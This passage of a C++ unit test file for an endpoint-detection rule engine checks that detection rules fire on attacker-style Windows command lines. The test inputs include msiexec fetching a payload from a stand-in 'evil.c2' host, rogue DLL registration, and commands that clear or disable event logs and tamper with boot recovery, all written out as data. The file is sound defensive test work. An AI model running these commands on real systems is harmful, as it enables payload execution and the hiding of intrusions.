                                      8001, 9001, base + 20000000);
    execute.fields[edr::field::kRemoteThread] = "true";
    detector.Enrich(execute);
    DT_CHECK(execute.fields.at(edr::field::kInjectChainScore) == "75");
    engine.OnEvent(execute);
    DT_CHECK(Has(hits, "EDR-128"));
    hits.clear();
    engine.OnEvent(access);
    DT_CHECK(!Has(hits, "EDR-133"));
}

void TestRuleEdr139To150() {
    edr::RuleEngine engine;
    engine.LoadFromFile(ProductionRulesPath());
    std::vector<std::string> hits;
    engine.SetAlertCallback(
        [&](const edr::Alert& alert) { hits.push_back(alert.ruleId); });

    auto process = [](const char* image, const char* cmd) {
        edr::Event ev;
        ev.type = EDR_EVT_PROCESS_START;
        ev.fields[edr::field::kPid] = "1";
        ev.fields[edr::field::kType] = "PROCESS_START";
        ev.fields[edr::field::kImage] = image;
        if (cmd) ev.fields[edr::field::kCommandLine] = cmd;
        return ev;
    };
    auto reg = [](const char* key, const char* value) {
        edr::Event ev;
        ev.type = EDR_EVT_REG_WRITE;
        ev.fields[edr::field::kType] = "REG_WRITE";
        ev.fields[edr::field::kRegKey] = key;
        if (value) ev.fields[edr::field::kRegValue] = value;
        return ev;
    };

    /* EDR-139 T1082 */
    engine.OnEvent(process("C:\\Windows\\System32\\systeminfo.exe", "systeminfo"));
    DT_CHECK(Has(hits, "EDR-139"));
    hits.clear();
    engine.OnEvent(process("C:\\Windows\\System32\\notepad.exe", "notepad readme"));
    DT_CHECK(!Has(hits, "EDR-139"));

    /* EDR-140 T1033 */
    engine.OnEvent(process("C:\\Windows\\System32\\whoami.exe", "whoami /all"));
    DT_CHECK(Has(hits, "EDR-140"));
    hits.clear();
    engine.OnEvent(process("C:\\Windows\\System32\\whoami.exe", "whoami"));
    DT_CHECK(!Has(hits, "EDR-140"));

    /* EDR-141 T1016 */
    engine.OnEvent(process("C:\\Windows\\System32\\ipconfig.exe", "ipconfig /all"));
    DT_CHECK(Has(hits, "EDR-141"));
    hits.clear();
    engine.OnEvent(process("C:\\Windows\\System32\\ipconfig.exe", "ipconfig"));
    DT_CHECK(!Has(hits, "EDR-141"));

    /* EDR-142 T1007 */
    engine.OnEvent(process("C:\\Windows\\System32\\sc.exe",
                           "sc queryex type= service state= all"));
    DT_CHECK(Has(hits, "EDR-142"));
    hits.clear();
    engine.OnEvent(process("C:\\Windows\\System32\\sc.exe", "sc start spooler"));
    DT_CHECK(!Has(hits, "EDR-142"));

    /* EDR-143 T1021.001 */
    edr::Event net;
    net.type = EDR_EVT_NET_CONNECT;
    net.fields[edr::field::kType] = "NET_CONNECT";
    net.fields[edr::field::kDstIp] = "10.10.10.5";
    net.fields[edr::field::kDstPort] = "3389";
    engine.OnEvent(net);
    DT_CHECK(Has(hits, "EDR-143"));
    hits.clear();
    net.fields[edr::field::kDstPort] = "443";
    engine.OnEvent(net);
    DT_CHECK(!Has(hits, "EDR-143"));

    /* EDR-144 T1047 */
    engine.OnEvent(process("C:\\Windows\\System32\\wbem\\wmic.exe",
                  "wmic /node:pc2 process call create cmd.exe"));
    DT_CHECK(Has(hits, "EDR-144"));
    hits.clear();
    engine.OnEvent(process("C:\\Windows\\System32\\wbem\\wmic.exe",
                  "wmic cpu get loadpercentage"));
    DT_CHECK(!Has(hits, "EDR-144"));

    /* EDR-145 T1218.008 */
    engine.OnEvent(process("C:\\Windows\\System32\\odbcconf.exe",
                  "odbcconf /a {REGSVR C:\\evil.dll}"));
    DT_CHECK(Has(hits, "EDR-145"));
    hits.clear();
    engine.OnEvent(process("C:\\Windows\\System32\\odbcconf.exe",
                  "odbcconf /d dsn"));
    DT_CHECK(!Has(hits, "EDR-145"));

    /* EDR-146 T1218.001 */
    engine.OnEvent(process("C:\\Windows\\System32\\msiexec.exe",
                  "msiexec /i https://evil.c2/payload.msi /qn"));
    DT_CHECK(Has(hits, "EDR-146"));
    hits.clear();
    engine.OnEvent(process("C:\\Windows\\System32\\msiexec.exe",
                  "msiexec /i C:\\app\\setup.msi"));
    DT_CHECK(!Has(hits, "EDR-146"));

    /* EDR-147 T1562.002 */
    engine.OnEvent(reg(
        "HKLM\\SYSTEM\\CurrentControlSet\\Services\\Eventlog\\Start", "0"));
    DT_CHECK(Has(hits, "EDR-147"));
    hits.clear();
    engine.OnEvent(reg(
        "HKLM\\SYSTEM\\CurrentControlSet\\Services\\Eventlog\\Start", "2"));
    DT_CHECK(!Has(hits, "EDR-147"));

    /* EDR-148 T1547.010 */
    engine.OnEvent(reg(
        "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors\\EvilMon\\Driver",
        "C:\\evilmon.dll"));
    DT_CHECK(Has(hits, "EDR-148"));
    hits.clear();
    engine.OnEvent(reg(
        "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Queue\\X", "dummy"));
    DT_CHECK(!Has(hits, "EDR-148"));

    /* EDR-149 T1069 */
    engine.OnEvent(process("C:\\Windows\\System32\\net.exe",
                  "net localgroup administrators"));
    DT_CHECK(Has(hits, "EDR-149"));
    hits.clear();
    engine.OnEvent(process("C:\\Windows\\System32\\net.exe",
                  "net use z: \\\\server\\share"));
    DT_CHECK(!Has(hits, "EDR-149"));

    /* EDR-150 T1529 */
    engine.OnEvent(process("C:\\Windows\\System32\\shutdown.exe",
                  "shutdown /r /t 0 /f"));
    DT_CHECK(Has(hits, "EDR-150"));
    hits.clear();
    engine.OnEvent(process("C:\\Windows\\System32\\shutdown.exe",
                  "shutdown /r /t 3600"));
    DT_CHECK(!Has(hits, "EDR-150"));
}

void TestPowerShellAndEventLogRules() {
    edr::RuleEngine engine;
    engine.LoadFromFile(ProductionRulesPath());
    std::vector<std::string> hits;
    engine.SetAlertCallback(
        [&](const edr::Alert& alert) { hits.push_back(alert.ruleId); });

    auto matches = [&](const char* rule, const char* type,
                       const char* image, const char* command) {
        hits.clear();
        edr::Event event;
        event.type = EDR_EVT_PROCESS_START;
        event.fields[edr::field::kType] = type;
        event.fields[edr::field::kImage] = image;
        event.fields[edr::field::kCommandLine] = command;
        engine.OnEvent(event);
        return Has(hits, rule);
    };

    DT_CHECK(matches("EDR-001", "PROCESS_START", "C:\\Windows\\pwsh.exe",
                     "pwsh.exe -EncodedCommand AAAA"));
    DT_CHECK(matches("EDR-001", "PROCESS_START", "powershell.exe",
                     "powershell.exe -enc AAAA"));
    DT_CHECK(!matches("EDR-001", "PROCESS_START", "fakepowershell.exe",
                      "fakepowershell.exe -enc AAAA"));
    DT_CHECK(!matches("EDR-001", "PROCESS_START", "powershell.exe",
                      "powershell.exe -encrypt backup.zip"));
    DT_CHECK(!matches("EDR-001", "FILE_CREATE", "powershell.exe",
                      "powershell.exe -enc AAAA"));

    DT_CHECK(matches("EDR-464", "PROCESS_START",
                     "C:\\Windows\\System32\\wevtutil.exe",
                     "wevtutil sl Security /e:false"));
    DT_CHECK(matches("EDR-464", "PROCESS_START", "wevtutil.exe",
                     "wevtutil sl Microsoft-Windows-PowerShell/Operational /e:0"));
    DT_CHECK(!matches("EDR-464", "PROCESS_START", "wevtutil.exe",
                      "wevtutil sl Security /e:true"));
    DT_CHECK(!matches("EDR-464", "PROCESS_START", "wevtutil.exe",
                      "wevtutil sl Security /e:1"));
    DT_CHECK(!matches("EDR-464", "PROCESS_START", "wevtutil.exe",
                      "wevtutil sl Security /e:01"));
    DT_CHECK(!matches("EDR-464", "PROCESS_START", "fakewevtutil.exe",
                      "fakewevtutil sl Security /e:false"));
    DT_CHECK(!matches("EDR-464", "REG_WRITE", "wevtutil.exe",
                      "wevtutil sl Security /e:false"));

    DT_CHECK(matches("EDR-465", "PROCESS_START", "powershell.exe",
                     "powershell.exe -Command Clear-EventLog -LogName Security"));
    DT_CHECK(!matches("EDR-465", "PROCESS_START", "powershell.exe",
                      "powershell.exe Get-EventLog -LogName Security"));
    DT_CHECK(!matches("EDR-465", "PROCESS_START", "cmd.exe",
                      "cmd.exe /c echo Clear-EventLog -LogName Security"));

    const char* channelKey =
        "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\"
        "Channels\\Microsoft-Windows-PowerShell/Operational";
    const std::string disableChannel =
        std::string("reg add ") + channelKey +
        " /v Enabled /t REG_DWORD /d 0 /f";
    DT_CHECK(matches("EDR-470", "PROCESS_START", "C:\\Windows\\System32\\reg.exe",
                     disableChannel.c_str()));
    DT_CHECK(matches("EDR-470", "PROCESS_START", "reg.exe",
                     (std::string("reg.exe add \"") + channelKey +
                      "\" /v Enabled /t REG_DWORD /d 0x0 /f").c_str()));
    DT_CHECK(!matches("EDR-470", "PROCESS_START", "reg.exe",
                      (std::string("reg add ") + channelKey +
                       " /v Enabled /t REG_DWORD /d 1 /f").c_str()));
    DT_CHECK(!matches("EDR-470", "PROCESS_START", "reg.exe",
                      (std::string("reg add ") + channelKey +
                       " /v MaxSize /t REG_DWORD /d 0 /f").c_str()));
    DT_CHECK(!matches("EDR-470", "PROCESS_START", "reg.exe",
                      "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Publishers\\x /v Enabled /t REG_DWORD /d 0"));
    DT_CHECK(!matches("EDR-470", "PROCESS_START", "fake-reg.exe",
                      disableChannel.c_str()));
    DT_CHECK(!matches("EDR-470", "REG_WRITE", "reg.exe",
                      disableChannel.c_str()));
}

void TestEarlyRuleSafety() {
    edr::RuleEngine engine;
    engine.LoadFromFile(ProductionRulesPath());
    std::vector<edr::Alert> hits;
    engine.SetAlertCallback([&](const edr::Alert& alert) { hits.push_back(alert); });
    auto event = [&](const char* type, const char* image,
                     const char* parent, const char* filePath) {
        hits.clear();
        edr::Event ev;
        ev.fields[edr::field::kType] = type;
        ev.fields[edr::field::kImage] = image;
        ev.fields[edr::field::kParentImage] = parent;
        ev.fields[edr::field::kFilePath] = filePath;
        engine.OnEvent(ev);
    };
    auto action = [&](const char* id) {
        for (const auto& hit : hits)
            if (hit.ruleId == id) return hit.action;
        return std::string();
    };

    event("PROCESS_START", "C:\\Windows\\System32\\RUNDLL32.EXE",
          "C:\\Windows\\System32\\cmd.exe", "");
    DT_CHECK(action("EDR-002") == "alert");
    event("FILE_CREATE", "C:\\Windows\\System32\\rundll32.exe",
          "C:\\Windows\\System32\\cmd.exe", "");
    DT_CHECK(action("EDR-002").empty());
    event("PROCESS_START", "C:\\Windows\\System32\\fakerundll32.exe",
          "C:\\Windows\\System32\\cmd.exe", "");
    DT_CHECK(action("EDR-002").empty());
    event("PROCESS_START", "rundll32.exe", "C:\\Windows\\EXPLORER.EXE", "");
    DT_CHECK(action("EDR-002").empty());

    event("FILE_CREATE", "", "", "C:\\Users\\a\\AppData\\Local\\Temp\\setup.exe");
    DT_CHECK(action("EDR-003") == "alert");
    event("PROCESS_START", "C:\\Users\\a\\AppData\\Local\\Temp\\setup.exe", "", "");
    DT_CHECK(action("EDR-003-KILL") == "alert");
}

void TestDuplicateRuleIdRejectedWithoutReplacingRules() {
    const char* path = "edr-native-duplicate-rule-id.json";
    const char* original =
        R"({"rules":[{"id":"baseline","action":"alert","match":{"type":{"eq":"PROCESS_START"}}}]})";
    const char* duplicate =
        R"({"rules":[{"id":"duplicate","action":"alert","match":{"type":{"eq":"PROCESS_START"}}},{"id":"duplicate","action":"alert","match":{"type":{"eq":"PROCESS_START"}}}]})";
    { std::ofstream out(path, std::ios::binary); out << original; }
    edr::RuleEngine engine;
    engine.LoadFromFile(path);
    std::vector<std::string> hits;
    engine.SetAlertCallback([&](const edr::Alert& alert) { hits.push_back(alert.ruleId); });
    { std::ofstream out(path, std::ios::binary); out << duplicate; }
    bool rejected = false;
    try { engine.LoadFromFile(path); }
    catch (const std::runtime_error& e) {
        rejected = std::string(e.what()).find("duplicate") != std::string::npos;
    }
    DT_CHECK(rejected);
    DT_CHECK(engine.RuleCount() == 1);
    DT_CHECK(!engine.MaybeReload());
    DT_CHECK(engine.ReloadCount() == 0);
    edr::Event ev;
    ev.fields[edr::field::kType] = "PROCESS_START";
    engine.OnEvent(ev);
    DT_CHECK(hits.size() == 1 && hits[0] == "baseline");
    DeleteFileA(path);
}

void TestBcdeditRecoveryPolicyRule() {
    edr::RuleEngine engine;
    engine.LoadFromFile(ProductionRulesPath());
    std::vector<std::string> hits;
    engine.SetAlertCallback(
        [&](const edr::Alert& alert) { hits.push_back(alert.ruleId); });

    auto matches = [&](const char* image, const char* command) {
        hits.clear();
        edr::Event event;
        event.type = EDR_EVT_PROCESS_START;
        event.fields[edr::field::kType] = "PROCESS_START";
        event.fields[edr::field::kImage] = image;
        event.fields[edr::field::kCommandLine] = command;
        engine.OnEvent(event);
        return Has(hits, "EDR-471");
    };

    DT_CHECK(matches("C:\\Windows\\System32\\bcdedit.exe",
                     "bcdedit /set {default} bootstatuspolicy ignoreallfailures"));
    DT_CHECK(matches("bcdedit.exe",
                     "bcdedit /set {current} bootstatuspolicy ignoreallfailures /quiet"));
    DT_CHECK(!matches("bcdedit.exe", "bcdedit /enum {current}"));
    DT_CHECK(!matches("bcdedit.exe",
                      "bcdedit /enum {current} bootstatuspolicy ignoreallfailures"));
    DT_CHECK(!matches("bcdedit.exe",
                      "bcdedit /set {default} bootstatuspolicy displayallfailures"));
    DT_CHECK(!matches("fake-bcdedit.exe",
                      "bcdedit /set {default} bootstatuspolicy ignoreallfailures"));
}

} // namespace

void RunInjectionChainDetectorTests() {
    TestInjectionChainNoCrashAndSkip();
    TestInjectionChainProgression();
    TestInjectionChainMinTransitionScore();
    TestInjectionChainCapacityEviction();
    TestRuleEdr127And128();
    TestRuleEdr129To132();
    TestRuleEdr133To136();
    TestInjectionChainRulesPipeline();
    TestRuleEdr139To150();
}

void RunAttackChainDetectorTests() {
    TestAttackChainBasic();
    TestAttackChainPerPidIsolation();
    TestAttackChainWindowExpiry();
    TestAttackChainIdentityAndRulePipeline();
    TestAttackChainLifecycleDispatch();
    TestAttackChainOpaqueAndExactIdentity();
    TestAttackChainExpiryBetweenSweepsAndLateEvidence();
    TestDetectorConfigStrictAtomic();
    TestHooksConfigKeys();
    TestRuleEdr135Pipeline();
    TestPowerShellAndEventLogRules();
    TestEarlyRuleSafety();
    TestDuplicateRuleIdRejectedWithoutReplacingRules();
    TestBcdeditRecoveryPolicyRule();
}
